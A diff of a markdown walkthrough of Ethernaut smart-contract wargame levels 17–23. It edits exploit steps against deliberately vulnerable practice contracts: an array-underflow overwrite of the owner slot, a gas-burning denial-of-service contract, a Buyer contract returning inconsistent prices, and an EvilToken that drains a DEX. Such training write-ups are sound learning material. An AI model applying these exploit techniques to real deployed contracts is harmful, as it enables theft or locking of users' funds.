@@ -977,7 +977,7 @@ Get the address of the `SimpleToken` that was deployed via the `Recovery` contra
 
 ### 3. Interact with the recovered token address in Remix
 
-Load the `SimpleToken` contract using the recovered address and call:
+Load the `SimpleToken` contract using the recovered address and call `destroy()`
 
 ```solidity
 destroy(payable("yourWalletAddress"))
@@ -989,12 +989,12 @@ Triggers `selfdestruct()` to send the 0.001 ETH to your wallet.
 
 ### Success Check
 
-After calling `destroy()`, check your wallet balance or ensure the contract no longer holds ETH.
+After calling `destroy()`, check the wallet balance
 
 ---
 
 ## Level Completed
-![Level Complete Output](assets/level17-recovery-success.png)
+![Level Complete Output](assets/recovery.png)
 
 
 # Ethernaut Level 18: MagicNumber
@@ -1085,7 +1085,7 @@ await contract.setSolver(solverAddr);
 
 ### 3. Submitted the instance
 
-## Level Completed
+### Level Completed
 ![Level Complete Output](assets/magicnumber.png)
 
 
@@ -1103,43 +1103,24 @@ await contract.setSolver(solverAddr);
 
 ---
 
-## Understanding the Storage Layout
-
-| Slot         | Content                              |
-|--------------|--------------------------------------|
-| 0            | `owner` (20 bytes) + `contact` (1 byte) |
-| 1            | `codex.length`                       |
-| keccak256(1) | Start of `codex` array               |
-
-- The dynamic array `codex` does not start at slot 1—it starts at `keccak256(1)`.
-- After causing an underflow in `codex.length`, I was able to write to any slot by finding an index `i` such that:  
-  `keccak256(1) + i ≡ 0 mod 2²⁵⁶`  
-  ⟶ `i = 2²⁵⁶ - keccak256(1)`
-
----
-
-### 1. I Enabled the Contacted Modifier
+### 1. Enabled the Contacted Modifier
 
 ```js
 await contract.make_contact();
 ```
-
 This set `contact = true`, so I could use `retract()` and `revise()`.
 
 ---
 
-### 2. Caused an Array Underflow
-
+### 2. Caused an Array Underflo
 ```js
 await contract.retract();
 ```
-
 This changed `codex.length` from 0 to `2^256 - 1`, making the array span all of contract storage.
 
 ---
 
 ### 3. Calculated the Slot Offset
-
 ```js
 const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
 // Output: '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
@@ -1147,42 +1128,34 @@ const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
 const i = BigInt(2n ** 256n) - BigInt(p);
 // Output: 35707666377435648211887908874984608119992236509074197713628505308453184860938n
 ```
-
 This index maps directly to storage slot `0`.
 
 ---
 
 ### 4. Prepared the Payload to Overwrite Owner
-
 ```js
 const content = '0x' + '0'.repeat(24) + player.slice(2);
 // Output: '0x000000000000000000000000<player_address>'
 ```
-
 Padded my address with 12 bytes of `0x00` to form a 32-byte `bytes32` value.
 
 ---
 
 ### 5. Overwrote the Owner Variable
-
 ```js
 await contract.revise(i, content);
 ```
-
 This wrote the padded player address into slot `0`, overwriting the contract's `owner`.
 
 ---
 
-### Level Completed
-
+### 6.Verified ownership and submitted the instance.
 ```js
 await contract.owner() === player; // true
 ```
 
-Verified ownership and submitted the instance.
-
+### Level Completed
 ![Level Complete Output](assets/aliencodex.png)
-
 
 # Ethernaut Level 20: Denial
 
@@ -1231,27 +1204,19 @@ contract GasBurner {
     }
 }
 ```
-
 - The `receive()` function runs a loop until `gasleft()` is zero, consuming all gas sent with the call.
 
 ---
 
 ### 2. Set `GasBurner` as the Withdrawal Partner
-
 ```js
 await contract.setWithdrawPartner("<gas-burner-address>");
 ```
-
 - Now, any call to `withdraw()` will invoke `GasBurner.receive()`, consuming all gas and preventing `owner.transfer(...)`.
 
 ---
 
 ### Level Completed
-
-**did not call** `withdraw()` myself — just setting the malicious partner was enough.
-The level checks if the owner is blocked from withdrawing under a 1M gas cap.
-Submitted the instance, and the level was marked complete.
-
 ![Level Complete Output](assets/denial.png)
 
 
@@ -1261,7 +1226,7 @@ Submitted the instance, and the level was marked complete.
 
 - **Vulnerability**: The `Shop` contract calls the `price()` function of the `Buyer` contract **twice**, once for validation and once for assignment, assuming consistent return values from a `view` function.
 - **Exploit**:
-  - I deployed a custom `Buyer` contract that implements the `price()` function to return different values depending on the `Shop` contract’s `isSold` state.
+  - Deployed a custom `Buyer` contract that implements the `price()` function to return different values depending on the `Shop` contract’s `isSold` state.
   - On the first call (inside the `if` condition), `price()` returned the full asking price (≥ 100).
   - On the second call (after `isSold` is set to true), `price()` returned `0`, effectively buying the item for free.
 
@@ -1318,33 +1283,25 @@ contract Buyer {
 ---
 
 ### 2. Initiated the Purchase
-
 ```js
-await buyerContract.buyFromShop("<shop-instance-address>");
+await buyerContract.buyFromShop("<instance-address>");
 ```
-
 - This triggered the two calls to `price()`.
 - My contract returned 100 for the first check, and 0 for the assignment after `isSold` was true.
 
 ---
 
 ### 3. Verified the Exploit
-
 ```js
 await contract.price().then(v => v.toString()); // Output: '0'
 await contract.isSold(); // Output: true
 ```
-
 - Item was marked as sold.
 - Final price was set to `0`.
 
 ---
 
 ### Level Completed
-
-- Successfully bought the item for **0 wei**, bypassing the original 100 wei price.
-- Submitted the instance and completed the level.
-
 ![Level Complete Output](assets/shop.png)
 
 
@@ -1397,14 +1354,12 @@ await contract.balanceOf(t1, instance).then(v => v.toString())
 ```
 
 ### Level Completed
-Successfully drained all of `token1` from the Dex by abusing the flawed swap pricing logic. Challenge completed.
 ![Level Complete Output](assets/Dex.png)
 
 
 # Ethernaut Level 23: Dex Two 
 
-### Strategy
-
+## Strategy
 Unlike the previous DEX level, **DexTwo allows swapping *any* token**, not just the two official tokens (`token1` and `token2`). This is a critical flaw.
 
 We exploit this by creating our **own ERC-20 token (EvilToken)** and trick the DEX into thinking it’s a valid swap pair. Because the `swap()` logic only relies on balance ratios and doesn’t restrict token types, we can inflate the EVL/`token1` and EVL/`token2` price ratio and **drain the DEX**.
@@ -1421,7 +1376,6 @@ function swap(address from, address to, uint256 amount) public {
     ...
 }
 ```
-
 This allows a **malicious token** to be used in swaps.
 
 ---
@@ -1431,7 +1385,6 @@ This allows a **malicious token** to be used in swaps.
 #### 1. Deploy EvilToken
 
 Deploy the following contract in Remix or similar:
-
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -1444,23 +1397,19 @@ contract EvilToken is ERC20 {
     }
 }
 ```
-
 Mint: `400` EVL to yourself (player).
 
 ---
 
 #### 2. Send 100 EVL to DexTwo
-
 ```js
 await evilToken.transfer(contract.address, 100);
 ```
-
 This sets a 1:1 ratio between EVL and `token1` (and later `token2`).
 
 ---
 
 #### 3. Approve DexTwo to use 300 EVL
-
 ```js
 await evilToken.approve(contract.address, 300);
 ```
@@ -1468,7 +1417,6 @@ await evilToken.approve(contract.address, 300);
 ---
 
 #### 4. Check token addresses
-
 ```js
 const t1 = await contract.token1();
 const t2 = await contract.token2();
@@ -1478,7 +1426,6 @@ const evl = evilToken.address;
 ---
 
 #### 5. Swap 100 EVL for `token1`
-
 ```js
 await contract.swap(evl, t1, 100);
 ```
@@ -1494,7 +1441,6 @@ Verify:
 ---
 
 #### 6. Swap 200 EVL for `token2`
-
 ```js
 await contract.swap(evl, t2, 200);
 ```
